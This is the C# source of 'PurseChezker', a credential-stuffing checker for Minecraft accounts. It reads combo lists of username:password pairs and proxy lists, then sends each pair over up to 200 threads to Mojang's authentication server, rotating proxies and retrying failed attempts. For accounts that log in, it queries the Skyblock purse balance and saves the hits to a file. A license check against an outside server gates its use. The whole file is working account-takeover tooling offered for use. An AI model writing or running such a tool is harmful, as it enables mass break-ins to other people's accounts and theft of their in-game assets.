using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Vostok.Configuration.Sources.Yaml;
using xNet;
using Console = Colorful.Console;

namespace PurseChezker {
    static class Program {
        private static Dictionary<string, string> customFiles = new Dictionary<string, string>(),
            customLisence = new Dictionary<string, string>();

        private static int keked = 0,
            now = 0,
            hit = 0,
            fail = 0;

        private static Double cpm = 0.0,
            hitper = 0.0,
            failper = 0.0;

        private static string strTime = "";

        private static void setStrTime() {
            DateTime now = DateTime.Now;
            strTime = "[" + now.Hour + "-" + now.Minute + "-" + now.Second + "] " + now.Day + "-" + now.Month + "-" + now.Year;
        }

        private static string[] configText = new string[] {
            "#  ___",
            "# | _ \\_  _ _ _ ___ ___    ____ _               _",
            "# |  _/ || | '_(_-</ -_)  / ___| |__   ___  ___| | _____ _ __",
            "# |_|  \\_,_|_| /__/\\___| | |   | '_ \\ / _ \\/ __| |/ / _ \\ '__|",
            "#                        | |___| | | |  __/ (__|   <  __/ |",
            "#    DevDauXanh#6857      \\____|_| |_|\\___|\\___|_|\\_\\___|_|",
            "",
            "#You need to put your license info here to active this shjt keker",
            "license:",
            "  key: xxxxx",
            "  user: xxxxx",
            "",
            "#Custom setting for checker",
            "settings:",
            "  proxy-loader:",
            "    #type of proxy (HTTP/SOCKS4/SOCKS5)",
            "    type: HTTP",
            "    # true => when run, this keker will open form to choose proxy file",
            "    # false => keker will use default proxy file!",
            "    custom-choose: true",
            "",
            "  combo-loader:",
            "    # true => when run, this keker will open form to choose combo file",
            "    # false => keker will use default combo file!",
            "    custom-choose: true",
            "",
            "  #number of thread will run to check combo, required greater than 0",
            "  threads: 200",
            "",
            "  #setting connect to account",
            "  connection:",
            "    #number of times retries to check account",
            "    retries: 2",
            "    #time to wait to check other account or retry (milliseconds)",
            "    wait: 1000",
            "    #time to read info of account then disconnect (seconds)",
            "    time-out: 10",
            "",
            "  #setting for account had checked",
            "  checked-config:",
            "    capture:",
            "      #print account if hit",
            "      hit: true",
            "      #print account if failed",
            "      fail: true",
            "",
            "    #export to file",
            "    save:",
            "      #export hit accounts",
            "      hit: true",
            "      #export failed accounts",
            "      fail: true",
        };

        [STAThread]
        static void Main() {
            run();
        }

        [Description("TOTAL PROGGRAM")]
        private static void run() {
            setTitle("PurseChezker by DevDauXanh#6857");

            configLoad();

            var iconPurse = new string[] {
                " ___",
                "| _ \\_  _ _ _ ___ ___   ____ _               _",
                "|  _/ || | '_(_-</ -_) / ___| |__   ___  ___| | _____ _ __",
                "|_|  \\_,_|_| /__/\\___|| |   | '_ \\ / _ \\/ __| |/ / _ \\ '__|",
                "                      | |___| | | |  __/ (__|   <  __/ |",
                "   DevDauXanh#6857     \\____|_| |_|\\___|\\___|_|\\_\\___|_|",
            };

            write(iconPurse, Color.FromArgb(0, 255, 0));

            if (!isLogin()) {
                return;
            }

            write(
                new string[] {
                    " ",
                    " ",
                    " ",
                    "[1] - Purse Mode     |     [2] - Close",
                    " ",
                }
                , Color.White
            );

            writeInLine("[>] Your selection: ", Color.Aqua);

            Console.ForegroundColor = Color.FromArgb(255, 255, 102);
            var mode = Console.ReadLine();
            
            if (mode.Equals("2")) {
                return;
            }

            setStrTime();

            Console.Clear();
            purseChecking();
        }


        [Description("PURSE CHECKER")]
        private static void purseChecking() {
            string txt = File.ReadAllText(customFiles["configFile"]);
            var nodes = YamlConfigurationParser.Parse(txt)["settings"];

            var proxyLoader = nodes["proxy-loader"];
            var comboLoader = nodes["combo-loader"];
            var connection = nodes["connection"];
            var capture = nodes["checked-config"]["capture"];
            var save = nodes["checked-config"]["save"];

            var proxyType = proxyLoader["type"].Value;
            var proxyChoose = proxyLoader["custom-choose"].Value;

            var comboChoose = comboLoader["custom-choose"].Value;

            var threads = nodes["threads"].Value;

            var retries = connection["retries"].Value;
            var wait = connection["wait"].Value;
            var timeout = connection["time-out"].Value;

            var hitCapture = capture["hit"].Value;
            var failCapture = capture["fail"].Value;

            var hitSave = save["hit"].Value;
            var failSave = save["fail"].Value;

            var folder = AppDomain.CurrentDomain.BaseDirectory;

            write("Loading your combo...", Color.LightPink);
            if (!comboLoad(bool.Parse(comboChoose), folder + "\\combo.yml")) return;

            string[] combo = File.ReadAllLines(customFiles["comboFile"]);
            write("Loaded " + combo.Length + " line(s)", Color.LightPink);

            write(" ", Color.LightPink);

            write("Loading your proxies...", Color.LightPink);
            if (!proxiesLoad(bool.Parse(proxyChoose), folder + "\\proxies.yml")) return;

            string[] proxies = File.ReadAllLines(customFiles["proxyFile"]);
            write("Loaded " + proxies.Length + " line(s)", Color.LightPink);

            string folderPath = AppDomain.CurrentDomain.BaseDirectory + "result/" + strTime;
            string strHit = folderPath + "/hits.yml";
            string strFail = folderPath + "/fail.yml";

            if (bool.Parse(hitSave) || bool.Parse(failSave)) {
                Directory.CreateDirectory(folderPath);

                if (bool.Parse(hitSave)) File.Create(strHit).Close();
                if (bool.Parse(failSave)) File.Create(strFail).Close();
            }

            write(new string[] {
                " ",
                " ",
                "[>] Proxy type: " + proxyType,
                " ",
                "[>] Threads: " + threads,
                " ",
                "[>] Hit capture: " + hitCapture,
                "[>] Fail capture: " + failCapture,
                " ",
                "[>] Hit save: " + hitSave,
                "[>] Fail save: " + failSave,
            }, Color.MediumPurple);

            Thread.Sleep(2000);

            Console.Clear();

            Task.Factory.StartNew(() => {
                Stopwatch sw = new Stopwatch();
                sw.Start();

                while (keked < combo.Length) {
                    cpm = now * 22.4;
                    now = 0;
                    sw.Reset();
                    sw.Start();
                    Thread.Sleep(5000);
                }
            });

            int pxint = 0;

            bool isDone = Parallel.ForEach(
                combo,
                
                new ParallelOptions {
                    MaxDegreeOfParallelism = int.Parse(threads)
                },
                
                async account => {
                    string proxy = "";
                    
                    if (pxint >= proxies.Length) {
                        pxint = 0;
                    }

                    proxy = proxies[pxint];

                    var json = accounts(account, proxy, proxyType, int.Parse(timeout));
                    bool status = bool.Parse(json.Substring(0, json.IndexOf("_")));

                    var work = false;

                    if (!status) {
                        if (int.Parse(retries) > 0) {
                            for (int i = 0; i < int.Parse(retries); i++) {
                                var json2 = accounts(account, proxies[new Random().Next(0, proxies.Length - 1)], proxyType, int.Parse(timeout));
                                bool status2 = bool.Parse(json2.Substring(0, json2.IndexOf("_")));

                                if (status2) {
                                    work = true;
                                    break;
                                }
                            }
                        }
                    } else work = true;

                    if (work) {
                        Interlocked.Increment(ref hit);
                        if (bool.Parse(hitCapture)) Console.WriteLine("[+] " + account + " - " + json.Substring(json.IndexOf("_") + 1), Color.Green);
                        if (bool.Parse(hitSave)) {
                            try {
                                using (StreamWriter writer = new StreamWriter(strHit, true)) {
                                    writer.WriteLine(account);
                                }
                            } catch {
                                Thread.Sleep(20);
                            }
                        }
                    } else {
                        Interlocked.Increment(ref fail);
                        if (bool.Parse(failCapture)) Console.WriteLine("[-] " + account, Color.Tomato);
                        if (bool.Parse(failSave)) {
                            try {
                                using (StreamWriter writer = new StreamWriter(strFail, true)) {
                                    writer.WriteLine(account);
                                }
                            } catch {
                                Thread.Sleep(20);
                            }
                        }
                    }

                    Interlocked.Increment(ref keked);
                    Interlocked.Increment(ref now);

                    hitper = ((double)hit / (double)combo.Length) * 100.0;
                    failper = ((double)fail / (double)combo.Length) * 100.0;

                    Console.Title = "PurseChezker by DevDauXanh#6857 | CHECKED: {checked}/{size} | HIT: {hits} ({hit_per}) | FAIL: {fail} ({fail_per}) | CPM: {cpm}"
                            .Replace("{checked}", keked + "")
                            .Replace("{size}", combo.Length + "")
                            .Replace("{hits}", hit + "")
                            .Replace("{cpm}", (int)cpm + "")
                            .Replace("{hit_per}", Math.Round(hitper, 2) + "%")
                            .Replace("{fail_per}", Math.Round(failper, 2) + "%")
                            .Replace("{fail}", fail + "");

                    Interlocked.Increment(ref pxint);
                }
            ).IsCompleted;

            Task.Factory.StartNew(() => {
                while (isDone) {
                    isDone = false;
                    write("DONE!", Color.Aquamarine);
                }
            });

            Console.ReadLine();
        }


        private static string accounts(string account, string proxy, string proxytype, int timeout) {
            string def = "false_";

            if (!proxy.Contains(":") || proxy.Split(':').Length < 2) return def;
            if (!account.Contains(":") || account.Split(':').Length < 2) return def;

            var proxySplit = proxy.Split(':');
            var proxyIp = proxySplit[0];
            var proxyPort = proxySplit[1];

            var accountSplit = account.Split(':');

            using (HttpRequest http = new HttpRequest()) {
                try {
                    switch (proxytype) {
                        case "HTTPS":
                            http.Proxy = HttpProxyClient.Parse(proxyIp + proxyPort);
                            break;
                        case "SOCK4":
                            http.Proxy = Socks4ProxyClient.Parse(proxyIp + proxyPort);
                            break;
                        case "SOCK5":
                            http.Proxy = Socks5ProxyClient.Parse(proxyIp + proxyPort);
                            break;
                    }

                    if (proxySplit.Length == 4) {
                        http.Username = proxySplit[2];
                        http.Password = proxySplit[3];
                    }

                    http.UserAgent = xNet.Http.ChromeUserAgent();
                    http.AddHeader("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2");
                    http.AllowAutoRedirect = false;
                    http.IgnoreProtocolErrors = true;

                    http.ConnectTimeout = timeout;

                    var php = http.Post("https://authserver.mojang.com/authenticate", "{\"agent\": {\"name\":\"Minecraft\",\"version\":\"1\"},\"username\":\"" + accountSplit[0] + "\",\"password\":\"" + accountSplit[1] + "\",\"requestUser\":\"true\"}", "application/json").ToString();
                    Console.ForegroundColor = Color.Tomato;
                    if (!php.Contains("error")) {
                        if (php.Contains("selectedProfile")) {
                            dynamic json = JsonConvert.DeserializeObject(php);
                            string name = json.selectedProfile.name;

                            using (HttpRequest http2 = new HttpRequest()) {
                                dynamic json2 = JsonConvert.DeserializeObject(http.Get("https://storemc.net/api/skyblock/user/" + name).ToString());

                                string objsb = "";
                                int c = 0;

                                foreach (var obj in json2.purse) {
                                    if (c == 0) {
                                        objsb += obj;
                                    } else {
                                        objsb += " | " + obj;
                                    }

                                    c++;
                                }
                                Console.ForegroundColor = Color.Green;
                                def = (json2.status == "success") + "_" + objsb;
                            }
                        }
                    }
                } catch (Exception ex) {
                    return def;
                }
            }

            return def;
        }


        [Description("HWID CHECKER")]
        private static bool isLogin() {
            bool obf = false;

            string txt = File.ReadAllText(customFiles["configFile"]);
            var nodes = YamlConfigurationParser.Parse(txt);

            var license = nodes["license"];

            var key = license["key"].Value;
            var user = license["user"].Value;

            using (HttpRequest http = new HttpRequest()) {
                dynamic json = JsonConvert.DeserializeObject(http.Get("https://storemc.net/api/license/", new RequestParams() {
                    ["key"] = key,
                    ["user"] = user,
                }).ToString());

                obf = json.status == "success";

                string msg = "";
                MessageBoxIcon boxIcon = MessageBoxIcon.Error;

                if (obf) {
                    msg = "You have logged in successful!";
                    boxIcon = MessageBoxIcon.Information;
                } else msg = json.msg;

                MessageBox.Show(msg, "PurseChezker by DevDauXanh#6857", MessageBoxButtons.OK, boxIcon);
            }

            return obf;
        }


        [Description("CONFIG LOADER")]
        private static void configLoad() {
            string strPath = AppDomain.CurrentDomain.BaseDirectory + "\\config";

            if (!Directory.Exists(strPath)) {
                Directory.CreateDirectory(strPath);
            }

            string configPath = strPath + "\\config.yml";

            customFiles.Add("configFile", configPath.Replace("\\", "/"));

            if (!File.Exists(configPath)) {
                File.Create(configPath).Close();
                File.WriteAllLines(configPath, configText);
            }
        }


        [Description("COMBO LOADER")]
        private static bool comboLoad(bool openDialog, string cbPath) {
            bool obf = false;

            if (openDialog) {
                using (OpenFileDialog openFileDialog = new OpenFileDialog()) {
                    openFileDialog.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
                    openFileDialog.Title = "Choose your combo file";
                    openFileDialog.Filter = "Combo File (*.*)|*.*";
                    openFileDialog.FilterIndex = 1;
                    openFileDialog.RestoreDirectory = true;

                    if (openFileDialog.ShowDialog() == DialogResult.OK) {
                        customFiles.Add("comboFile", openFileDialog.FileName);
                        obf = true;
                    }
                }
            } else {
                customFiles.Add("comboFile", cbPath);
                obf = true;
            }

            return obf;
        }


        [Description("PROXY LOADER")]
        private static bool proxiesLoad(bool openDialog, string pxPath) {
            bool obf = false;

            if (openDialog) {
                using (OpenFileDialog openFileDialog = new OpenFileDialog()) {
                    openFileDialog.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
                    openFileDialog.Title = "Choose your proxies file";
                    openFileDialog.Filter = "Proxies File (*.*)|*.*";
                    openFileDialog.FilterIndex = 1;
                    openFileDialog.RestoreDirectory = true;

                    if (openFileDialog.ShowDialog() == DialogResult.OK) {
                        customFiles.Add("proxyFile", openFileDialog.FileName);
                        obf = true;
                    }
                }
            } else {
                customFiles.Add("proxyFile", pxPath);
                obf = true;
            }

            return obf;
        }

        private static void write(string str, Color color) {
            for (int i = 0; i < str.Length; i++) {
                if (i == str.Length - 1) {
                    Console.Write(str[i] + "\n", color);
                } else {
                    Console.Write(str[i], color);
                }
                Thread.Sleep(3);
            }
        }

        private static void write(string[] strList, Color color) {
            foreach (var str in strList) {
                for (int i = 0; i < str.Length; i++) {
                    if (i == str.Length - 1) {
                        Console.Write(str[i] + "\n", color);
                    } else {
                        Console.Write(str[i], color);
                    }
                    Thread.Sleep(3);
                }
            }
        }

        private static void writeInLine(string str, Color color) {
            for (int i = 0; i < str.Length; i++) {
                if (i == str.Length - 1) {
                    Console.Write(str[i], color);
                } else {
                    Console.Write(str[i], color);
                }
                Thread.Sleep(3);
            }
        }

        private static void setTitle(string title) {
            Console.Title = title;
        }
    }
}
